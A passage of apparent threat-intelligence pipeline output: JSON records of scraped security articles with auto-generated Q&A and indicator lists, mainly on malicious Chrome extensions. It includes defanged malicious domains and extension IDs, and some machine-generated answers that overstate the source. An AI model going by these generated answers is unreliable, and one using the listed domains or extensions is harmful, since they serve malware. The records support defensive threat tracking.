Scheme\n\nSilent Ransom Group Targeting Law Firms\n\nOperation ENDGAME strikes again: the ransomware kill chain broken at its source\n\nMalware\n\nSarcoma Ransomware Unveiled: Anatomy of a Double Extortion Gang\n\nRVTools Bumblebee Malware Attack – How a Trusted IT Tool Became a Malware Delivery Vector\n\nRedisRaider: Weaponizing misconfigured Redis to mine cryptocurrency at scale\n\nHidden Threats of Dual-Function Malware Found in Chrome Extensions\n\nLumma Stealer: Breaking down the delivery techniques and capabilities of a prolific infostealer\n\nA Brief History of DanaBot, Longtime Ecrime Juggernaut Disrupted by Operation Endgame\n\nHacking\n\nPwn2Own Berlin 2025: Day Three Results\n\nFirefox Security Response to pwn2own 2025\n\nThe Legacy Loophole: How Attackers Are Exploiting Entra ID and What to Do About It\n\nO2 VoLTE: locating any customer with a phone call\n\nViciousTrap – Infiltrate, Control, Lure: Turning edge devices into honeypots en masse\n\nAdvisory Update on Cyber Threat Activity Targeting Commvault’s SaaS Cloud Application (Metallic)\n\nIntelligence and Information Warfare\n\nRogue communication devices found in Chinese solar power inverters\n\nNew Japan law allows preemptive defense of infrastructure cyberattack\n\nESET APT Activity Report Q4 2024–Q1 2025\n\nFrom banks to battalions: SideWinder’s attacks on South Asia’s public sector\n\nRussian GRU Targeting Western Logistics Entities and Technology Companies\n\nUAT-6382 exploits Cityworks zero-day vulnerability to deliver malware\n\nCybersecurity\n\nEx-FBI boss James Comey investigated for seashell photo seen as threat to Trump\n\n“We would be less confidential than Google” – Proton threatens to quit Switzerland over new surveillance law\n\nJapan passed a law allowing preemptive offensive cyber actions\n\nWe Made Luigi Mangione’s 3D-Printed Gun—and Fired It\n\nCyber attack threat keeps me awake at night, bank boss says\n\nBy Default, Signal Doesn’t Recall\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, newsletter)\n\n#### you might also like\n\n##### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\n##### Operation ENDGAME disrupted global ransomware infrastructure\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\nBreaking News / May 25, 2025\n\n###### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\nBreaking News / May 25, 2025\n\n###### Operation ENDGAME disrupted global ransomware infrastructure\n\nCyber Crime / May 25, 2025\n\n###### Silent Ransom Group targeting law firms, the FBI warns\n\nMalware / May 24, 2025\n\n###### Operation RapTor led to the arrest of 270 dark web vendors and buyers\n\nDeep Web / May 23, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.extensiontotal.com/a-month-of-malware-in-the-chrome-web-store-4c617ea0574b", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware found in the Chrome Web Store includes types that manipulate search results, download and inject remote payloads, and weaken browser security to send users to malicious websites.", "question": "What kind of malware is it?"}, {"answer": "The attack involves malware campaigns that manipulate search engine results, download and inject remote payloads into websites, and weaken browser security to send users to malicious websites.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, one of the campaigns mentioned downloads and injects a remote payload into websites.", "question": "Does the malware using web inject?"}, {"answer": "The text mentions phishing websites and malicious extensions that can manipulate search engine results and inject remote payloads, but it does not explicitly mention credential theft from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware is embedded in malicious Chrome extensions.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The text does not explicitly mention stealing credit cards or bank information, but it does mention phishing websites and malicious activities that could potentially lead to such theft.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals information such as search engine results and sends it back to the C2 server, and in some cases, it injects remote payload into websites.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent back to the C2 (Command and Control) server.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://blog.extensiontotal.com/a-month-of-malware-in-the-chrome-web-store-4c617ea0574b", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "soundenhancementextension[.]com"}, {"type": "Domain or URL", "value": "fvpvpnextension[.]com"}, {"type": "Domain or URL", "value": "redpandaextension[.]com"}, {"type": "Domain or URL", "value": "thundervpnextension[.]com"}, {"type": "Domain or URL", "value": "safxtech[.]site"}, {"type": "Domain or URL", "value": "abslocks[.]com"}, {"type": "Domain or URL", "value": "tedext[.]com"}, {"type": "Domain or URL", "value": "spdtests[.]com"}, {"type": "Domain or URL", "value": "jibberjot[.]top"}, {"type": "Domain or URL", "value": "zorpleflux[.]top"}, {"type": "Domain or URL", "value": "snogglewomp[.]top"}, {"type": "Domain or URL", "value": "digigtalneo[.]top"}, {"type": "Domain or URL", "value": "insightpro[.]top"}, {"type": "Domain or URL", "value": "mangaot[.]top"}, {"type": "Domain or URL", "value": "metapixeldebugger[.]top"}, {"type": "Domain or URL", "value": "dialsync[.]top"}, {"type": "Domain or URL", "value": "wobblefizz[.]top"}, {"type": "Domain or URL", "value": "easylinksaver[.]sbs"}, {"type": "Domain or URL", "value": "glimmerbloop[.]top"}, {"type": "Domain or URL", "value": "fizzlepopcorn[.]top"}, {"type": "Domain or URL", "value": "twizzleflap[.]top"}, {"type": "Domain or URL", "value": "ad-vision[.]click"}, {"type": "Domain or URL", "value": "extify[.]top"}, {"type": "Domain or URL", "value": "ioapp[.]sbs"}, {"type": "Domain or URL", "value": "iogroup[.]top"}, {"type": "Domain or URL", "value": "extensiontotal.com"}, {"type": "Chrome Extension ID", "value": "lhfgpkbdjfgdgcmpfdlcldohckepmidb"}, {"type": "Chrome Extension ID", "value": "lkpiodmpjdhhhkdhdbnncigggodgdfli"}, {"type": "Chrome Extension ID", "value": "gmigkpkjegnpmjpmnmgnkhmoinpgdnfc"}, {"type": "Chrome Extension ID", "value": "jpdlneoinfoijpiodbocgjhpalhegaie"}, {"type": "Chrome Extension ID", "value": "pdcohffegleekoehjhafagpohpjckcgh"}, {"type": "Chrome Extension ID", "value": "faihnblmeedkfdeghdhimhgcdkhcaphb"}, {"type": "Chrome Extension ID", "value": "gaphdgiciagcoikgdldobainboocpoid"}, {"type": "Chrome Extension ID", "value": "hcmbimkddpfppcliidckggmfghocfafh"}, {"type": "Chrome Extension ID", "value": "pocfdebmmcmfanifcfeeiafokecfkikj"}, {"type": "Chrome Extension ID", "value": "mipophmjfhpecleajkijfifmffcjdiac"}, {"type": "Chrome Extension ID", "value": "mblkbbabkcmjnegndgcepingkhcjabhh"}, {"type": "Chrome Extension ID", "value": "bacicbbedbgjonbafnmoekmploklfmao"}, {"type": "Chrome Extension ID", "value": "ejeecppjjcpcclomlodghpjjlihfcbkf"}, {"type": "Chrome Extension ID", "value": "ffmojdkcgbiepappjpenimeidhldnibk"}, {"type": "Chrome Extension ID", "value": "efdnilbdigepbjkckljemoifjnnkamob"}, {"type": "Chrome Extension ID", "value": "gmmdfmcllbelhpjfggbmiamilhbfhlji"}, {"type": "Chrome Extension ID", "value": "ndcahmkjpabhlakhjilmnpbjmcpngien"}, {"type": "Chrome Extension ID", "value": "ejegejbfcinnompejfcmjpolljkfkgfh"}, {"type": "Chrome Extension ID", "value": "bmkpibhkckdgncchaodfphkhipmiinga"}, {"type": "Chrome Extension ID", "value": "fcfmhlijjmckglejcgdclfneafoehafm"}, {"type": "Chrome Extension ID", "value": "kkgmdjjpobmenpkhcclceelekpbnnana"}, {"type": "Chrome Extension ID", "value": "oiiegmhfibklpccpeoegpblibiljinap"}, {"type": "Chrome Extension ID", "value": "koffbbfiodjgpibaahdpodppdahhppfn"}, {"type": "Chrome Extension ID", "value": "ckcfkaikieiicfdeomgehmnjglnofhde"}, {"type": "Chrome Extension ID", "value": "plpmggfglncceinmilojdkiijhmajkjh"}, {"type": "Chrome Extension ID", "value": "ebldcmdjfokdlhlldbfgljogkjkadoag"}, {"type": "Chrome Extension ID", "value": "jnfbbgcbjbmndefaeopjlicndkpoiijj"}, {"type": "Chrome Extension ID", "value": "knmmpciebaoojcpjjoeonlcjacjopcpf"}, {"type": "Chrome Extension ID", "value": "ealidhdffgdnpnleccmkflgjablmmeid"}, {"type": "Chrome Extension ID", "value": "pghpaiiokhmphkhhdbhmpmjbkhhhblke"}, {"type": "Chrome Extension ID", "value": "onlfplekhflgkkahfknbomblkbodojin"}, {"type": "Chrome Extension ID", "value": "fcihjjeicllgohlhdnmjjelfefboemng"}, {"type": "Chrome Extension ID", "value": "lnfeimcodfbhcnbllmeemfadfnmeacac"}, {"type": "Chrome Extension ID", "value": "plbdecidfccdnfalpnbjdilfcmjichdk"}, {"type": "Chrome Extension ID", "value": "mjkgicbimflmibgncimppcdnolfnimch"}, {"type": "Chrome Extension ID", "value": "jlejemblfhoaabnkabommaomhocjfkgl"}, {"type": "Chrome Extension ID", "value": "bhiibmginjfaoflclcpbkijochaimnnj"}, {"type": "Chrome Extension ID", "value": "cillhjakfcmnkgmknampjnpodihgejkb"}, {"type": "Chrome Extension ID", "value": "ndhaplegimoabombidcdfogcnpmcicik"}, {"type": "Chrome Extension ID", "value": "hnflmljcnfilfecedajepfkdfladaegc"}, {"type": "Chrome Extension ID", "value": "ppdofgbomnffhdmngcpibhmdkdmhpdan"}, {"type": "Chrome Extension ID", "value": "gdfjahfbaillhkeigeinoomhjnfajbon"}, {"type": "Chrome Extension ID", "value": "kcjcogkcebfnmloijkngamncnimhefoe"}, {"type": "Chrome Extension ID", "value": "objjdlekohkfgdnoahneiacfgpaikdhn"}, {"type": "Chrome Extension ID", "value": "fbdoonilnmmodjgiogpindcbaoinnglp"}, {"type": "Chrome Extension ID", "value": "bhfelhfpjghfmhogedjnlmdpkbhmjhlf"}, {"type": "Chrome Extension ID", "value": "ompafndkajgkoldjbgnbikogdkljinlb"}, {"type": "Chrome Extension ID", "value": "kghcdbkokgjghlfeojcpeoclfnljkbdk"}], "keywords_found": ["analysis", "malicious", "phishing", "browser"], "article_textual_content": "# ExtensionTotal\n\nFollow publication\n\nStreamline enterprise supply chain security by quickly detecting malicious, risky, vulnerable, or non-compliant third-party extensions and software packages\n\nFollow publication\n\n# A Month Of Malware In The Chrome Web Store\n\n--\n\nListen\n\nShare\n\nSee, you may think that the Cyberhaven incident or the “Feb 2025” incident (in which three million users were exposed through malicious Chrome extensions) are the only malware campaigns lurking around the Chrome Web Store. The fact is, we find malware on the Chrome Web Store every. single. month.\n\nSo, in keeping with our tradition of exposing supply chain attacks in marketplaces, I wanted to give you all a glimpse of what we found on the Chrome Web Store in the past month.\n\n45 extensions exposed for malware. 250,000 users infected.\n\nBefore we dive into this story, I wanted to note that you’ll be able find all the IOCs at the bottom of the blog post.\n\nNow, let’s get on with our story.\n\n(March 2025)\n\n# Honestly? At this point, if we don’t find malware, I get worried.\n\nOur business is to protect organizations from malware and other troubles on marketplaces. Today, marketplaces (like the Chrome Web Store, Huggingface, Github, VSCode Marketplace, etc.) are the single biggest entry point of software into organizations, making them extremely risky when ungoverned. Part of what we do to help mitigate this risk for organizations is that we continuously scan them and analyze the risk of every single marketplace item automatically.\n\nThe Chrome Web Store is one of those marketplaces, and through our risk analysis, we flag tens of malware items we find on it every month.\n\nToday, we share some findings to educate you and help you avoid your next incident.\n\n# So, What did we find this month?\n\nWe found three significant campaigns. One manipulates search results on popular search engines like Google / Bing / Yahoo and can send you to phishing websites. The second downloads and injects remote payload into websites, and the third weakens your browser and sends you to malicious websites on demand.\n\nFirst, we have “Video Downloader,” a seemingly naive extension that allows you to save video files from popular websites.\n\n(FYI — This extension is still live on the Store, we’ve reports all of these to Google, some of which were taken down by the time of publication)\n\nHidden behind its ratings, 10,000 users, and pretty design is a C2 sever that fetches new configurations every 3 hours, manipulates Chrome network rules, and sends back information it collects to the C2 server. This is part of the campaign that manipulates search engine results. Our risk engine automatically pivots on domains exhibiting malicious behavior, and it uncovered an extensive campaign with many extensions exhibiting the same exact behavior with the same malicious code while sharing the attack infrastructure.\n\n👉 Some Examples:\nDownloader For Instagram (80K installs): bhfelhfpjghfmhogedjnlmdpkbhmjhlf, ompafndkajgkoldjbgnbikogdkljinlb (🚨 Live on the store)\nBass Booster (10K installs): ndhaplegimoabombidcdfogcnpmcicik\nVideo Downloader (10K installs): kghcdbkokgjghlfeojcpeoclfnljkbdk (🚨 Live on the store)\n\nTotal: 105K infected users.\n\nFun fact: malicious code was introduced in version updates for some of these extensions; for example, Bass Booster was clean until version 2.1, in which malicious code was introduced. This underscores the importance of controlling version updates.\n\n😅😅\n\nNext, we have an extensive campaign with extensions that download a second-stage encrypted payload, save it to local storage, and inject it as a hidden DOM element into websites. Our risk engine flagged this one for many reasons; most interestingly, our code similarity scanner flagged it, which found the same attack pattern in all of the extensions. “CEB,” as seen in the snippet below, is some identifier of the same attacker used in all these extensions.\n\n👉 Some Examples:\nMeta Pixel Debugger: lhfgpkbdjfgdgcmpfdlcldohckepmidb\nEasy Link Saver: gaphdgiciagcoikgdldobainboocpoid\nDeepSeek AI | Free AI Assistant: pocfdebmmcmfanifcfeeiafokecfkikj\nCreativePeek — Free tool: mblkbbabkcmjnegndgcepingkhcjabhh\n\nLastly, we got a few VPN extensions that share the same attack infrastructure, which actually is what flagged them in the first place. Our risk engine looks at previously reported malicious extensions and their infrastructure and looks for repeat offenses; in this case, we found a few VPN extensions, one of which is still live on the store, using attack infrastructure from a previously documented campaign. They all use the same underlying servers as each other, and all share the same malicious CSP stripping strategy previously seen.\n\n👉 Some Examples:\nFVP Free Vpn Proxy (90K installs): ebldcmdjfokdlhlldbfgljogkjkadoag\nThunder FREE VPN For Chrome (40K installs): knmmpciebaoojcpjjoeonlcjacjopcpf\nRed Panda Free VPN | Unlimited VPN (9K installs): plpmggfglncceinmilojdkiijhmajkjh\n\nDirectly linked to Video Effects for YouTube And Audio Enhancer and Mike Adblock für Chrome | Chrome-Werbeblocker, previously documented as malicious.\n\nThere are some other single malicious extensions that are not part of a large campaign, we’ve included them all in the IOCs list below.\n\nA deeper technical analysis will be published soon, containing the payloads of the C&amp;Cs and the encryption methods.\n\n# What should I do?\n\nSome of these extensions were already removed from the Chrome Web Store after being reported, but, and this is a massive “but,” extensions that get removed from the Chrome Web Store stay installed on your browser and are not removed automatically; thus, they will live in your org forever. That is why we highly recommend checking your environment against the IOCs. If you need help, feel free to reach out to us here.\n\n# Sigh… What’s next?\n\nAll of that was just from the last month. Like many other marketplaces, the Chrome Web Store gives great productivity value at the expense of introducing many security challenges. We see malware like this every day and help organizations mitigate it. You ask, how do you balance security and productivity? We’ve built ExtensionTotal to do just that for practitioners and enterprises alike. We help discover, assess, and govern everything your teams pull from marketplaces like Chrome Web Store, VSCode, Huggingface, Homebrew, GitHub, and beyond.\n\nTrusted by Fortune 100s, 500s, and defense tech enterprises, ExtensionTotal automates security processes, providing visibility, governance, and proactive risk to reduce and balance this attack surface.\n\nIf you’d like to chat, hit us up here 🤙\n\n## ExtensionTotal | Enterprise Supply Chain Firewall for Software Marketplaces\n\n### ExtensionTotal empowers security teams to secure endpoint software marketplaces, from VS Code and IDE extensions to…\n\nextensiontotal.com\n\n# IOCs List\n\nDomains:\nsoundenhancementextension[.]com\nfvpvpnextension[.]com\nredpandaextension[.]com\nthundervpnextension[.]com\nsafxtech[.]site\nabslocks[.]com\ntedext[.]com\nspdtests[.]com\njibberjot[.]top\nzorpleflux[.]top\nsnogglewomp[.]top\ndigigtalneo[.]top\ninsightpro[.]top\nmangaot[.]top\nmetapixeldebugger[.]top\ndialsync[.]top\nwobblefizz[.]top\neasylinksaver[.]sbs\nglimmerbloop[.]top\nfizzlepopcorn[.]top\ntwizzleflap[.]top\nad-vision[.]click\ndigigtalneo[.]top\nextify[.]top\nioapp[.]sbs\niogroup[.]top\n\nIDs:\nlhfgpkbdjfgdgcmpfdlcldohckepmidb\nlkpiodmpjdhhhkdhdbnncigggodgdfli\ngmigkpkjegnpmjpmnmgnkhmoinpgdnfc\njpdlneoinfoijpiodbocgjhpalhegaie\npdcohffegleekoehjhafagpohpjckcgh\nfaihnblmeedkfdeghdhimhgcdkhcaphb\ngaphdgiciagcoikgdldobainboocpoid\nhcmbimkddpfppcliidckggmfghocfafh\npocfdebmmcmfanifcfeeiafokecfkikj\nmipophmjfhpecleajkijfifmffcjdiac\nmblkbbabkcmjnegndgcepingkhcjabhh\nbacicbbedbgjonbafnmoekmploklfmao\nejeecppjjcpcclomlodghpjjlihfcbkf\nffmojdkcgbiepappjpenimeidhldnibk\nefdnilbdigepbjkckljemoifjnnkamob\ngmmdfmcllbelhpjfggbmiamilhbfhlji\nndcahmkjpabhlakhjilmnpbjmcpngien\nejegejbfcinnompejfcmjpolljkfkgfh\nbmkpibhkckdgncchaodfphkhipmiinga\nfcfmhlijjmckglejcgdclfneafoehafm\nkkgmdjjpobmenpkhcclceelekpbnnana\noiiegmhfibklpccpeoegpblibiljinap\nkoffbbfiodjgpibaahdpodppdahhppfn\nckcfkaikieiicfdeomgehmnjglnofhde\nplpmggfglncceinmilojdkiijhmajkjh\nebldcmdjfokdlhlldbfgljogkjkadoag\njnfbbgcbjbmndefaeopjlicndkpoiijj\nknmmpciebaoojcpjjoeonlcjacjopcpf\nealidhdffgdnpnleccmkflgjablmmeid\npghpaiiokhmphkhhdbhmpmjbkhhhblke\nonlfplekhflgkkahfknbomblkbodojin\nfcihjjeicllgohlhdnmjjelfefboemng\nlnfeimcodfbhcnbllmeemfadfnmeacac\nplbdecidfccdnfalpnbjdilfcmjichdk\nmjkgicbimflmibgncimppcdnolfnimch\njlejemblfhoaabnkabommaomhocjfkgl\nbhiibmginjfaoflclcpbkijochaimnnj\ncillhjakfcmnkgmknampjnpodihgejkb\nndhaplegimoabombidcdfogcnpmcicik\nhnflmljcnfilfecedajepfkdfladaegc\nppdofgbomnffhdmngcpibhmdkdmhpdan\ngdfjahfbaillhkeigeinoomhjnfajbon\nckcfkaikieiicfdeomgehmnjglnofhde\nkcjcogkcebfnmloijkngamncnimhefoe\nobjjdlekohkfgdnoahneiacfgpaikdhn\nfbdoonilnmmodjgiogpindcbaoinnglp\n\nChrome Extension\n\nChrome\n\nHacking\n\nMalware\n\nCybersecurity\n\n--\n\n--\n\n## Published in ExtensionTotal\n\nStreamline enterprise supply chain security by quickly detecting malicious, risky, vulnerable, or non-compliant third-party extensions and software packages\n\n## Written by Amit Assaraf\n\nCEO @ Koi\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.consilium.europa.eu/en/press/press-releases/2025/05/20/russian-hybrid-threats-eu-lists-further-21-individuals-and-6-entities-and-introduces-sectoral-measures-in-response-to-destabilising-activities-against-the-eu-its-member-states-and-international-partners/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://www.consilium.europa.eu/en/press/press-releases/2025/05/20/russian-hybrid-threats-eu-lists-further-21-individuals-and-6-entities-and-introduces-sectoral-measures-in-response-to-destabilising-activities-against-the-eu-its-member-states-and-international-partners/", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortra.com/blog/threat-analysis-malicious-npm-package-leveraged-o365-phishing-attack", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/over-70-malicious-npm-and-vs-code.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://socket.dev/blog/malicious-npm-packages-target-react-vue-and-vite-ecosystems-with-destructive-payloads", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://socket.dev/blog/malicious-npm-packages-target-react-vue-and-vite-ecosystems-with-destructive-payloads", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://osintteam.blog/osint-and-the-fight-against-recruitment-fraud-44216399b317?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves phishing attacks and recruitment fraud, where fraudsters exploit various platforms to lure job seekers with enticing but fraudulent offers.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://osintteam.blog/osint-and-the-fight-against-recruitment-fraud-44216399b317?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["cybercrime", "phishing", "intelligence", "fraud"], "article_textual_content": "# OSINT Team\n\nFollow publication\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\nFollow publication\n\nMember-only story\n\n# OSINT and the Fight Against Recruitment Fraud\n\n## How Open-Source Intelligence Protects Job Seekers\n\n1 day ago\n\n--\n\nShare\n\n## Surge in Recruitment Fraud Cases\n\nReports of job and recruitment fraud in the UK have surged alarmingly, with incidents more than doubling in just two years, according to BBC News and figures from Action Fraud, the national reporting centre for fraud and cybercrime in England, Wales, and Northern Ireland(Fraudsters exploit various platforms, including job boards, social media, and messaging apps, to lure job seekers with enticing but fraudulent offers. These scams often feature tell-tale warning signs such as unrealistic salary promises, requests for upfront payments, phishing for personal information, and the impersonation of legitimate recruiters.\n\n## Common Tactics Used by Fraudsters\n\nVictims are frequently targeted with convincing communications that exploit the urgency and stress of job hunting. Fraudsters may create fake company websites, use spoofed email domains, or even steal the identities of real recruiters to add legitimacy to their approach. In some cases, applicants are asked to pay for background checks, training, or equipment costs that genuine employers should always cover. The Financial Conduct Authority (FCA) and Action Fraud have repeatedly warned job…\n\n--\n\n--\n\n## Published in OSINT Team\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\n## Written by Paul Wright\n\nWith over 20 years of professional experience, he has developed notable expertise in cybercrime, intelligence (OSINT and HUMINT) and digital forensics.\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securitylabs.datadoghq.com/articles/mut-9332-malicious-solidity-vscode-extensions/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://securitylabs.datadoghq.com/articles/mut-9332-malicious-solidity-vscode-extensions/", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://infosecwriteups.com/mitm-https-payload-with-python-499ebf8e933f?source=rss----7b722bfd1b8d---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a Man-in-the-Middle (MITM) attack, which intercepts traffic between a system and the internet to inspect and decrypt HTTPS sessions.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://infosecwriteups.com/mitm-https-payload-with-python-499ebf8e933f?source=rss----7b722bfd1b8d---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://weekly.infosecwriteups.com/"}], "keywords_found": ["mitm", "threat"], "article_textual_content": "# InfoSec Write-ups\n\nFollow publication\n\nA collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: 